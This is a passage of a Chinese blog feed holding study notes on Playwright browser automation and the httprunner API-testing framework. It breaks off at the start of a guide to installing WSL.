Firefox浏览器，不支持IE11。</li><li>跨平台：Windows、Linux 和macOS</li><li>跨语言。 在 TypeScript, JavaScript, Python, .NET, Java 中使用 Playwright API</li><li>可用于模拟移动端WEB应用的测试，不支持在真机上测试</li><li>支持<strong>无头模式（默认）</strong>和有头模式—–强大之处：<code>无头</code></li></ul></li><li><p>二、快速可靠的执行</p><ul><li>自动等待元素</li><li>Playwright基于Websocket协议，可以接受浏览器（服务端）的信号</li><li>浏览器上下文并行：单个浏览器实例下创建多个浏览器上下文，每个浏览器上下文可以处理多个页面。</li><li>有弹性的元素选择：可以使用文本、可访问标签选择元素</li></ul></li><li><p>Playwright使用 Chrome DevTools 协议 （CDP） 与 Chromium 通信。对于Firefox和WebKit，Playwright实现了自己的协议，类似于CDP。一旦触发测试，client端代码将被转换为JSON格式，然后使用websocket 协议发送到服务器。palywright通过单个 websocket 协议连接传达所有请求，该连接将保持不变，直到所有测试执行完成。由于命令是在单个连接上发送的，因此测试失败或不稳定的可能性较小，并且命令可以快速执行。这种架构与Selenium相反，Selenium使用HTTP连接协议，并将每个命令（如浏览器打开，单击，发送密钥或关闭浏览器）作为单独的HTTP请求发送。此外，在Selenium中，服务器和客户端之间的连接将在每次请求后终止，并为下一个请求重新建立。最后划重点：<code>这就是Playwright比selenium快的原因！</code></p></li></ul><p>强适应性 • 测试不再容易失效<br>自动等待：Playwright 能够自动等待元素达到可操作的状态，外加一系列丰富的内置时间。不用再人工定义超时—-这是测试容易失败的主要原因。</p><p>Web有限的断言。Playwright 断言专门为动态加载的web应用设计。能够在满足需要的条件前自动重试。</p><p>可追踪。通过配置重试策略，采用捕捉执行轨迹、视频、截图来解决测试容易失效的问题。</p><p>不用再权衡取舍、不再有限制。</p><p>一切并行。跨越多个tabs、多个origins和多个users的测试场景。在一个测试中能够为不同的用户创建具有不同上下文的场景，并能在你的服务器上运行，</p><p>可信事件：元素悬停（hover）、动态控件的交互、生产可信时间，Playwright 使用与真实用户一致的输入方式（pipeline）。</p><p><strong>测试 frames，穿透 Shadow</strong> <strong>DOM****。</strong> Playwright 的选择器能够穿透 shadowDOM 和允许无缝输入 frame。</p><p><strong>一次登录。</strong> 保存上下文的身份验证状态并在所有测试中重用它。这绕过了每个测试中的重复登录操作，但提供了独立测试的完全隔离。</p><p>强大的工具</p><p><strong>Codegen 。</strong> 通过记录您的操作来生成测试。将它们保存为各种语言。</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="打开浏览器网页"><a href="#打开浏览器网页" class="headerlink" title="打开浏览器网页"></a>打开浏览器网页</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> playwright.sync_api <span class="hljs-keyword">import</span> sync_playwright<br><span class="hljs-keyword">with</span> sync_playwright() <span class="hljs-keyword">as</span> p:<br>    browser = p.chromium.launch(channel=<span class="hljs-string">&quot;chrome&quot;</span>, headless=<span class="hljs-literal">False</span>) <span class="hljs-comment"># headless无头</span><br>    page = browser.new_page()<br>    page.goto(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>) <span class="hljs-comment"># goto打开网页</span><br>    <span class="hljs-built_in">print</span>(page.title()) <span class="hljs-comment"># 打印title</span><br>    browser.close()<br></code></pre></td></tr></table></figure><h3 id="脚本录制："><a href="#脚本录制：" class="headerlink" title="脚本录制："></a>脚本录制：</h3><p>使用命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">playwright codegen --target python -o baidu_test.py -b chromium https://www.baidu.com/<br></code></pre></td></tr></table></figure><p>录制结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> playwright.sync_api <span class="hljs-keyword">import</span> Playwright, sync_playwright, expect<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">playwright: Playwright</span>) -&gt; <span class="hljs-literal">None</span>:<br>    browser = playwright.chromium.launch(headless=<span class="hljs-literal">False</span>)<br>    context = browser.new_context()<br>    page = context.new_page() <span class="hljs-comment"># 页面</span><br>    page.goto(<span class="hljs-string">&quot;https://www.baidu.com/&quot;</span>) <span class="hljs-comment"># 网址</span><br>    page.locator(<span class="hljs-string">&quot;#kw&quot;</span>).click()  <span class="hljs-comment"># 搜索框 点击 click</span><br>    page.locator(<span class="hljs-string">&quot;#kw&quot;</span>).fill(<span class="hljs-string">&quot;中国好声音&quot;</span>) <span class="hljs-comment"># 搜索框输入 fill</span><br>    page.get_by_role(<span class="hljs-string">&quot;button&quot;</span>, name=<span class="hljs-string">&quot;百度一下&quot;</span>).click() <span class="hljs-comment"># 输入完之后点击搜索</span><br>    <span class="hljs-keyword">with</span> page.expect_popup() <span class="hljs-keyword">as</span> page1_info:<br>        page.get_by_role(<span class="hljs-string">&quot;link&quot;</span>, name=<span class="hljs-string">&quot;中国好声音 - 百度百科&quot;</span>).click() <span class="hljs-comment"># 点进百科页面</span><br>    page1 = page1_info.value <span class="hljs-comment"># 新的页面来了</span><br>    <span class="hljs-keyword">with</span> page1.expect_popup() <span class="hljs-keyword">as</span> page2_info: <span class="hljs-comment"># 打开 新的页面了</span><br>        page1.locator(<span class="hljs-string">&quot;div&quot;</span>).<span class="hljs-built_in">filter</span>(has_text=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&quot;^薛之谦$&quot;</span>)).get_by_role(<span class="hljs-string">&quot;link&quot;</span>).click()  <span class="hljs-comment"># 在新的页面去点击了</span><br>    page2 = page2_info.value   <span class="hljs-comment"># 第三个页面来了。</span><br>    page2.close() <span class="hljs-comment"># 关闭页面3 </span><br>    page1.close() <span class="hljs-comment"># 关闭页面2 </span><br>    page.close() <span class="hljs-comment"># 关闭页面1 </span><br><br>    <span class="hljs-comment"># ---------------------</span><br>    context.close() <span class="hljs-comment"># 关闭程序</span><br>    browser.close() <span class="hljs-comment"># 关闭浏览器</span><br><br><br><span class="hljs-keyword">with</span> sync_playwright() <span class="hljs-keyword">as</span> playwright:<br>    run(playwright)<br><br></code></pre></td></tr></table></figure><h3 id="识别元素"><a href="#识别元素" class="headerlink" title="识别元素"></a>识别元素</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">page.get_by_role() <span class="hljs-comment"># 通过显式和隐式可访问性属性定位。</span><br><br>page.get_by_text() <span class="hljs-comment"># 按文本内容定位。</span><br><br>page.get_by_label() <span class="hljs-comment"># 通过关联标签的文本查找表单控件。</span><br><br>page.get_by_placeholder() <span class="hljs-comment"># 其文本替代品定位元素，通常是图像。</span><br><br>page.get_by_title() <span class="hljs-comment"># 通过标题属性定位元素。</span><br><br>page.get_by_test_id() <span class="hljs-comment"># 根据其data-testid属性定位元素（可以配置其他属性）。</span><br><br><br><br></code></pre></td></tr></table></figure><p>playwright除了上述定位方式，还支持selenium的8种by元素定位，id、xpath、css等等，另外还有W3C标准规定的webDriver协议为5种定位方式</p><p>CSS、Link text、Partial link text、Tag name、XPath</p><p>playwright把这些定位归类成3种，分别是：css、xpath、text</p><h3 id="判断元素状态"><a href="#判断元素状态" class="headerlink" title="判断元素状态"></a>判断元素状态</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">is_checked<br><br>is_disabled<br><br>is_editable<br><br>is_enabled<br><br>is_hidden<br><br>is_visible<br></code></pre></td></tr></table></figure><h3 id="元素操控"><a href="#元素操控" class="headerlink" title="元素操控"></a>元素操控</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">写相关操作：clear、fill<br><br>点击：click、dbclick<br><br>下拉选择框：select_option<br><br>文件上传：set_input_files<br><br>鼠标拖动：down、up、move、wheel<br><br>触摸屏幕：tap<br><br>键盘按键：press<br><br>截屏：screenshot<br><br>页面切换expect_popup<br><br>执行js：evaluate<br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【python】httprunner接口自动化框架</title>
    <link href="/2023/12/24/699httprunner%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A1%86%E6%9E%B6/"/>
    <url>/2023/12/24/699httprunner%E6%8E%A5%E5%8F%A3%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="httprunner接口自动化框架"><a href="#httprunner接口自动化框架" class="headerlink" title="httprunner接口自动化框架"></a>httprunner接口自动化框架</h1><h1 id="一、为什么选择httprunner？"><a href="#一、为什么选择httprunner？" class="headerlink" title="一、为什么选择httprunner？"></a>一、为什么选择httprunner？</h1><ul><li>HttpRunner是一个开源的 API 测试工具环境搭建，相比于其它 API 测试工具，HttpRunner 最大的不同在于设计理念：</li><li>约定大于配置：测试用例是标准结构化的，格式统一，方便协作和维护；</li><li>标准开放：基于开放的标准，支持HAR&#x2F;Postman&#x2F;Swagger等工具对接，轻松实现用例生成和转换；</li><li>一次投入多维复用：一套脚本可同时支持接口自动化测试、性能测试；</li><li>追求不重复造轮子，追求投入产出比；</li><li>Httprunner和其他开源框架相比，我们只需在yaml文件维护测试用例即可，不需要代码要求，但是需要严格遵循yanl格式编写，否则在后续不好排查错误，这也是httprunner的一个缺点；</li><li>目前市面上接口工具多，学习成本高，团队协作较困难，对语言能力有一定要求，门槛较高；</li></ul><h1 id="二、环境搭建（Python安装）"><a href="#二、环境搭建（Python安装）" class="headerlink" title="二、环境搭建（Python安装）"></a>二、环境搭建（Python安装）</h1><h2 id="1、python版本：2-7-3-7及以上版本，建议3-7及以上版本"><a href="#1、python版本：2-7-3-7及以上版本，建议3-7及以上版本" class="headerlink" title="1、python版本：2.7&#x2F;3.7及以上版本，建议3.7及以上版本"></a>1、python版本：2.7&#x2F;3.7及以上版本，建议3.7及以上版本</h2><ul><li>下载地址：<a href="https://www.python.org/downloads/">https://www.python.org/downloads/</a></li></ul><h2 id="2、验证安装是否成功"><a href="#2、验证安装是否成功" class="headerlink" title="2、验证安装是否成功"></a>2、验证安装是否成功</h2><ul><li>打开cmd命令行 输入python，如果能进入python命令模式就证明成功了</li><li></li></ul><p><img src="/img/httprunner/Untitled.png" alt="Untitled"></p><h2 id="3、安装httprunner第三方库"><a href="#3、安装httprunner第三方库" class="headerlink" title="3、安装httprunner第三方库"></a>3、安装httprunner第三方库</h2><p>pip install httprunner&#x3D;&#x3D;2.5.7 如果官网无法下载就加国内镜像 -i <a href="https://pypi.doubanio.com/simple">https://pypi.doubanio.com/simple</a></p><h2 id="4、查看命令行指令（掌握几个常用即可）"><a href="#4、查看命令行指令（掌握几个常用即可）" class="headerlink" title="4、查看命令行指令（掌握几个常用即可）"></a>4、查看命令行指令（掌握几个常用即可）</h2><ul><li>创建一个项目，可以在命令行查看httprunner帮助</li><li>httprunner -h 或者 hrun -h</li></ul><p><img src="/img/httprunner/Untitled%201.png" alt="Untitled"></p><p><img src="/img/httprunner/Untitled%202.png" alt="Untitled"></p><h2 id="5、创建脚手架"><a href="#5、创建脚手架" class="headerlink" title="5、创建脚手架"></a>5、创建脚手架</h2><ul><li>创建项目：hrun –startproject demo</li></ul><p><img src="/img/httprunner/Untitled%203.png" alt="Untitled"></p><h2 id="6、安装第三方依赖（）"><a href="#6、安装第三方依赖（）" class="headerlink" title="6、安装第三方依赖（）"></a>6、安装第三方依赖（）</h2><ul><li>可以在根目录下建个requirements.txt文件，需要安装的python依赖都在这个文件里面，进入到目录下，执行以下命令进行安装：</li></ul><p>pip install –r requirements2.txt</p><h1 id="三、框架结构"><a href="#三、框架结构" class="headerlink" title="三、框架结构"></a>三、框架结构</h1><h2 id="1、目录结构"><a href="#1、目录结构" class="headerlink" title="1、目录结构"></a>1、目录结构</h2><p><img src="/img/httprunner/Untitled%204.png" alt="Untitled"></p><h3 id="分层思想："><a href="#分层思想：" class="headerlink" title="分层思想："></a>分层思想：</h3><ul><li>api定义层：最底下的一层是api的定义层，最底</li><li>testcase层：测试用例层，调用定义层的内容，中间</li><li>testsuite：测试套件层，把用例装起来，最上</li><li></li></ul><p><img src="/img/httprunner/Untitled%205.png" alt="Untitled"></p><h3 id="api目录：存放描述api信息的yaml文件"><a href="#api目录：存放描述api信息的yaml文件" class="headerlink" title="api目录：存放描述api信息的yaml文件"></a>api目录：存放描述api信息的yaml文件</h3><ul><li>特别注意：yml文件需遵循严格的缩进，缩进多少格无所谓，只要保证同一层级的key对齐即可</li></ul><p><img src="/img/httprunner/Untitled%206.png" alt="Untitled"></p><h3 id="字段解释："><a href="#字段解释：" class="headerlink" title="字段解释："></a>字段解释：</h3><ul><li>name：对api进行描述</li><li>variables：把参数作为变量从外部传给api，可以将变量的参数都定义在variables</li><li>request：这个字段下放的都是api的基本信息如<ul><li>url(请求地址)，</li><li>method(请求方法)，</li><li>headers(请求头)，</li><li>data&#x2F;params&#x2F;json&#x2F;file (请求参数)</li></ul></li></ul><h3 id="一般接口有3种方式的请求参数"><a href="#一般接口有3种方式的请求参数" class="headerlink" title="一般接口有3种方式的请求参数"></a>一般接口有3种方式的请求参数</h3><ul><li>1.params字段传参：<ul><li>以key，value键值对方式放在url后面的参数用params字段去定义</li></ul></li><li>2.json字段传参：<ul><li>放在body以json格式参数的用json字段去定义</li></ul></li><li>3.c.data字段传参：<ul><li>放在body非json格式的参数用data字段去定义，如headers中</li></ul></li></ul><p>content-type&#x3D;application&#x2F;x-www-form-urlencoded</p><h3 id="参数引用：引用符："><a href="#参数引用：引用符：" class="headerlink" title="参数引用：引用符：$"></a>参数引用：引用符：$</h3><p><img src="/img/httprunner/Untitled%207.png" alt="Untitled"></p><ul><li>variables：api的ymal文件下：如果我们要把参数作为变量从外部传给api，那就把作为变量的参数都定义在variables字段下，如下图中的loginPara就可以被其它任何地方引用。</li></ul><p><img src="/img/httprunner/Untitled%208.png" alt="Untitled"></p><ul><li>validate：校验字段，需要校验的数据都写在这个字段下</li></ul><p><img src="/img/httprunner/Untitled%209.png" alt="Untitled"></p><h3 id="1-2-testcases目录：存放描述测试用例的yaml文件"><a href="#1-2-testcases目录：存放描述测试用例的yaml文件" class="headerlink" title="1.2 testcases目录：存放描述测试用例的yaml文件"></a>1.2 testcases目录：存放描述测试用例的yaml文件</h3><ul><li>config:指这条用例的配置信息，用例的一些配置信息可以写在这个字段下面，比如：<ul><li>name(必须的)：　这条用例的名字，</li><li>base_url(可选择的)： 接口的host地址，一般写域名</li><li>variables(可选择的)： 这条用例的一些变量，保存的变量，可以被下面引用</li><li>verify(可选，但默认false)：指定是否验证服务器的TLS证书。如果想要记录testcase中的http数据特别有用。如果不设置或者设置为true则会产生SSLError错误。</li><li>export(可选择的，必须会)：提取testcase的session变量。测试用例是为黑盒，config中的的variables视为输入，export为输出。特别是，当该testcase中的某个输出作为下一个testcase中的输入的时候特别有用。参数传递用的，</li><li>output(可选择的)：为了把变量暴露出来，打印日志时看的更清楚（比如说你提取了token,可以打印一下这个token看看自己有没有提取成功）</li></ul></li></ul><h3 id="teststeps-：指用例中的步骤，每一步就是调用一个api，test下面配置的字段就是这个步骤中涉及的字段，比如："><a href="#teststeps-：指用例中的步骤，每一步就是调用一个api，test下面配置的字段就是这个步骤中涉及的字段，比如：" class="headerlink" title="teststeps:：指用例中的步骤，每一步就是调用一个api，test下面配置的字段就是这个步骤中涉及的字段，比如："></a>teststeps:：指用例中的步骤，每一步就是调用一个api，test下面配置的字段就是这个步骤中涉及的字段，比如：</h3><ul><li><p>name：步骤描述</p></li><li><p>api： 指定调用的api路径文件。基于根目录的相对路径</p></li><li><p>testcase： 指定testcase的路径文件</p></li><li><p>extract： 提取响应中的字段（比如这个接口返回中的某个字段作为下一个接口的参数），可以提取的内容包含以下内容：</p><ul><li>atus_code、cookies、elapsed（响应时间）、headers、content、 text、json、encoding、ok、 reason、url</li></ul></li><li><p>variables：如果要把参数作为变量从外部传给api，那就把作为变量的 参数都定义在variables字段下，设置变量供下面用</p><ul><li><h2 id="引用debugtalk里面的数据库查询方法时，要在这里定义一个字段，-先把sql语句定义成一个字段，然后把sql语句引用到方法里面去，如下：-参数引用-ENV-STATIONNAME-的时候，要在variables下面先定义再引用"><a href="#引用debugtalk里面的数据库查询方法时，要在这里定义一个字段，-先把sql语句定义成一个字段，然后把sql语句引用到方法里面去，如下：-参数引用-ENV-STATIONNAME-的时候，要在variables下面先定义再引用" class="headerlink" title="引用debugtalk里面的数据库查询方法时，要在这里定义一个字段，  - 先把sql语句定义成一个字段，然后把sql语句引用到方法里面去，如下：  - 参数引用${ENV(STATIONNAME)的时候，要在variables下面先定义再引用"></a>引用debugtalk里面的数据库查询方法时，要在这里定义一个字段，<br>  - 先把sql语句定义成一个字段，然后把sql语句引用到方法里面去，如下：<br>  - <code>参数引用$&#123;ENV(STATIONNAME)的时候，要在variables下面先定义再引用</code></h2>  <img src="/img/httprunner/Untitled%2010.png" alt="Untitled"></li></ul></li><li><p>validate：校验字段，需要校验的数据都写在这个字段下，就是断言，下面会讲断言用法</p></li><li><p>⑦　碰到列表的时候，用list.0去提取。点0是表示提取索引下标为0的列表进行提取</p><ul><li><code>- eq: [ json.data.list.0.couponName, &quot;自动化测试兑换&quot; ]</code></li></ul></li></ul><h2 id="testsuites目录：存放用例集的yaml文件"><a href="#testsuites目录：存放用例集的yaml文件" class="headerlink" title="testsuites目录：存放用例集的yaml文件"></a>testsuites目录：存放用例集的yaml文件</h2><p><img src="/img/httprunner/Untitled%2011.png" alt="Untitled"></p><h3 id="字段解释：-1"><a href="#字段解释：-1" class="headerlink" title="字段解释："></a>字段解释：</h3><ol><li>testcases：指这条用例集，要执行的用例都现在这个字段下面</li><li>testcase：用例的路径字段</li><li>parameters：参数化字段，外部传的参给用例，都可以写在这个字段下面，测试数据中的参数可以写在这下面</li></ol><h3 id="用例编写"><a href="#用例编写" class="headerlink" title="用例编写"></a>用例编写</h3><ul><li>参数引用：在yaml文件中用“$”符号实现对参数的引用 比如:</li></ul><p><img src="/img/httprunner/Untitled%2012.png" alt="Untitled"></p><ul><li>2.2函数引用：在yaml文件中通过“${}”实现对函数的引用，比如：</li></ul><p><img src="/img/httprunner/Untitled%2013.png" alt="Untitled"></p><ul><li>所有函数都定义在debugtalk.py文件中，</li><li>如果在测试中有需要写代码处理的，就可以把代码写在debugtalk.py文件中，然后用例中就可以直接引用了。</li></ul><p><img src="/img/httprunner/Untitled%2014.png" alt="Untitled"></p><h1 id="运行接口"><a href="#运行接口" class="headerlink" title="运行接口"></a>运行接口</h1><h2 id="方式一："><a href="#方式一：" class="headerlink" title="方式一："></a>方式一：</h2><ul><li>使用命令行调试：hrun .\testsuites\xx测试集.yml</li><li>如果要打印运行详细日志，在命令后面加上–log-level</li></ul><p>hrun .\testsuites\xx测试集.yml –log-level debug</p><p><img src="/img/httprunner/Untitled%2015.png" alt="Untitled"></p><p><img src="/img/httprunner/Untitled%2016.png" alt="Untitled"></p><h2 id="方式二："><a href="#方式二：" class="headerlink" title="方式二："></a>方式二：</h2><ul><li>在工程跟目录下有一个runtest.py文件，里面指定要执行的文件路径就可以运用用例了，右键——Run rentest 就可以执行，执行后会在report目录下生成测试报告</li><li>通过<code>os.system</code>可以调用cmd命令，方便自己调试用。</li><li>注意一下，cmd命令的斜杠是反斜杠，注意斜杠加t需要双斜杠，不然会编译错误</li><li></li></ul><p><img src="/img/httprunner/Untitled%2017.png" alt="Untitled"></p><p><img src="/img/httprunner/Untitled%2018.png" alt="Untitled"></p><h1 id="测试报告"><a href="#测试报告" class="headerlink" title="测试报告"></a>测试报告</h1><p>报告保存在report目录下，每次执行完都会生成测试报告，用浏览器即可打开进行查看</p><p><img src="/img/httprunner/Untitled%2019.png" alt="Untitled"></p><p><img src="/img/httprunner/Untitled%2020.png" alt="Untitled"></p><h2 id="一些特殊接口—图片上传接口"><a href="#一些特殊接口—图片上传接口" class="headerlink" title="一些特殊接口—图片上传接口"></a>一些特殊接口—图片上传接口</h2><p>用抓包软件看到接口传参如图所示</p><p>注意：requests库会自动添加这个元素 {“Content-Type”:”multipart&#x2F;form-data”} ；加了反而会报错，从而导致请求不成功。</p><p>在前端允许和支持上传的所有格式文件中，当选择不同格式文件时对接口发起请求时，</p><p>Form Data会自动识别文件的Content-Type【根据传入的文件格式自动解析为headers中的Content-Type】以及Content-Disposition【该字段中包括接口的传参类型（例如下图的form-data），传入文件名（例如下图的filename）等】。</p><p><img src="/img/httprunner/Untitled%2021.png" alt="Untitled"></p><p>所以参数我们可以如图中files字段那样定义</p><p><img src="/img/httprunner/Untitled%2022.png" alt="Untitled"></p><h2 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h2><p><img src="/img/httprunner/Untitled%2023.png" alt="Untitled"></p><p>data目录下就是存放测试数据文件，我们需要上传文件或图片的数据可以放在这个目录下，或api中的一些参数数据可以以csv文件格式存放在这个目录下</p><h1 id="参数化："><a href="#参数化：" class="headerlink" title="参数化："></a>参数化：</h1><h2 id="对测试数据的引用"><a href="#对测试数据的引用" class="headerlink" title="对测试数据的引用"></a>对测试数据的引用</h2><ul><li>在用例中怎么使用测试数据文件中的数据呢，</li><li>框架中有个读取数据文件的函数P，</li><li>引用时参入数据文件地址作为参数 ${P(data&#x2F;对应的csv.csv)} 对应的csv.csv 文件内容如图，</li></ul><p><img src="/img/httprunner/Untitled%2024.png" alt="Untitled"></p><ul><li>注意：只能在testsuite中对测试数据的引用，测试数据中的参数可以 字段名-字段名的方式进行获取。qudaologin.csv中有几条记录，这样用例就会执行几次</li><li>再说一遍，只能在testsuite里面引用csv参数，<ul><li>在testcase的下面加一个字段parameters：下面再接需要被传参的字段名</li><li>csv的参数有多少行，对应的用例就会被执行多少次</li></ul></li></ul><p><img src="/img/httprunner/Untitled%2025.png" alt="Untitled"></p><h2 id="直接赋值参数"><a href="#直接赋值参数" class="headerlink" title="直接赋值参数"></a>直接赋值参数</h2><ul><li>多个关联参数，可以按照下图中的方式对用例参数进行赋值，进行该配置后，测试用例在运行时就会对 name，result实现数据驱动，即分别运行 3次测试，并且保证参数值总是成对使用。</li></ul><p><img src="/img/httprunner/Untitled%2026.png" alt="Untitled"></p><h2 id="单个参数关联"><a href="#单个参数关联" class="headerlink" title="单个参数关联"></a>单个参数关联</h2><ul><li>单个参数可以直接就可以按照如下方式进行配置，即分别使用 [1,2,3,4,5,6,7] 7个值运行测试用例。</li></ul><p><img src="/img/httprunner/Untitled%2027.png" alt="Untitled"></p><h1 id="环境变量："><a href="#环境变量：" class="headerlink" title="环境变量："></a>环境变量：</h1><ul><li>工程目录下有个.env文件，里面可以配置测试环境的地址，如图所示</li></ul><p><img src="/img/httprunner/Untitled%2028.png" alt="Untitled"></p><ul><li>框架有个获取环境文件的函数ENV, 调用时可以引用函数获取变量${ENV(TESTENV)}</li></ul><p><img src="/img/httprunner/Untitled%2029.png" alt="Untitled"></p><h1 id="9-断言校验"><a href="#9-断言校验" class="headerlink" title="9. 断言校验"></a>9. 断言校验</h1><h2 id="框架中已实现如下校验"><a href="#框架中已实现如下校验" class="headerlink" title="框架中已实现如下校验"></a>框架中已实现如下校验</h2><p><img src="/img/httprunner/Untitled%2030.png" alt="Untitled"></p><p><img src="/img/httprunner/Untitled%2031.png" alt="Untitled"></p><h2 id="9-2自定义校验函数"><a href="#9-2自定义校验函数" class="headerlink" title="9.2自定义校验函数"></a>9.2自定义校验函数</h2><p>对于自定义的校验函数，需要遵循三个规则：</p><ol><li>自定义校验函数需放置到debugtalk.py中</li><li>参数有两个：第一个为原始数据，第二个为原始数据经过运算后得到的预期结果值</li><li>在校验函数中通过assert将实际运算结果与预期结果值进行比较</li></ol><p>如图：在debugtalk.py文件中定义校验函数</p><p><img src="/img/httprunner/Untitled%2032.png" alt="Untitled"></p><p>然后在用例校验的时候引用这个校验函数</p><p><img src="/img/httprunner/Untitled%2033.png" alt="Untitled"></p><h2 id="9-3修改框架校验函数：不建议"><a href="#9-3修改框架校验函数：不建议" class="headerlink" title="9.3修改框架校验函数：不建议"></a>9.3修改框架校验函数：不建议</h2><ul><li>在httprunner&gt;builtin&gt;comparator新增自定义校验，然后在parser文件中定义校验缩写方法</li></ul><p><img src="/img/httprunner/Untitled%2034.png" alt="Untitled"></p><p><img src="/img/httprunner/Untitled%2035.png" alt="Untitled"></p><h2 id="9-4校验支持正则校验："><a href="#9-4校验支持正则校验：" class="headerlink" title="9.4校验支持正则校验："></a>9.4校验支持正则校验：</h2><p><img src="/img/httprunner/Untitled%2036.png" alt="Untitled"></p><p><img src="/img/httprunner/Untitled%2037.png" alt="Untitled"></p><h2 id="9-5数据库校验："><a href="#9-5数据库校验：" class="headerlink" title="9.5数据库校验："></a>9.5数据库校验：</h2><p>框架实现了对数据库的查询，操作数据库的原理是根据输入的SQL语句 过滤出要操作的tableName, 然后去配置文件中找到对应得tableName所在的地址和库进行连接和操作，操作数据库需要做如下配置，在跟目录下有个database.ini文件，在里面配置数据库相关信息</p><p><img src="/img/httprunner/Untitled%2038.png" alt="Untitled"></p><p><img src="/img/httprunner/Untitled%2039.png" alt="Untitled"></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>部署</tag>
      
      <tag>接口自动化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【other】WSL基础使用指南</title>
    <link href="/2023/12/23/905WSL%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
    <url>/2023/12/23/905WSL%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h1 id="WSL使用指南"><a href="#WSL使用指南" class="headerlink" title="WSL使用指南"></a>WSL使用指南</h1><h1 id="1、WSL介绍和安装"><a href="#1、WSL介绍和安装" class="headerlink" title="1、WSL介绍和安装"></a>1、WSL介绍和安装</h1><h4 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h4><ul><li>Windows Subsystem for Linux（简称WSL）是一个在Windows 10\11上能够运行原生Linux二进制可执行文件（ELF格式）的兼容层。它是由微软与Canonical公司合作开发，其目标是使纯正的Ubuntu、Debian等映像能下载和解压到用户的本地计算机，并且映像内的工具和实用工具能在此子系统上原生运行。</li><li><strong>优势</strong>：开发人员可以在 Windows 计算机上同时访问 Windows 和 Linux 的强大功能。 通过适用于 Linux 的 Windows 子系统 (WSL)，开发人员可以安装 Linux 发行版（例如 Ubuntu、OpenSUSE、Kali、Debian、Arch Linux 等），并直接在 Windows 上使用 Linux 应用程序、实用程序和 Bash 命令行工具，不用进行任何修改，也无需承担传统虚拟机或双启动设置的费用。</li><li>一句话，<strong>在windows上不需要通过虚拟机运行Linux</strong> ，</li></ul><h4 id="二、准备工作"><a href="#二、准备工作" class="headerlink" title="二、准备工作"></a>二、准备工作</h4><p>先开启Windows对子系统的支持：<strong>控制面板–&gt;程序–&gt;启用或关闭Windows功能</strong></p><ul><li>打开Hyper-V</li><li>打开适用于Linux的Windows子系统</li></ul><h4 id="三、安装WSL"><a href="#三、安装WSL" class="headerlink" title="三、安装WSL"></a>三、安装WSL</h4><h5 id="1-启用适用于-Linux-的-Windows-子系统"><a href="#1-启用适用于-Linux-的-Windows-子系统" class="headerlink" title="1 启用适用于 Linux 的 Windows 子系统"></a>1 启用适用于 Linux 的 Windows 子系统</h5><p>需要先启用“适用于 Linux 的 Windows 子系统”可选功能，然后才能在 Windows 上安装 Linux 分发。</p><p>以管理员身份打开 PowerShell（“开始”菜单 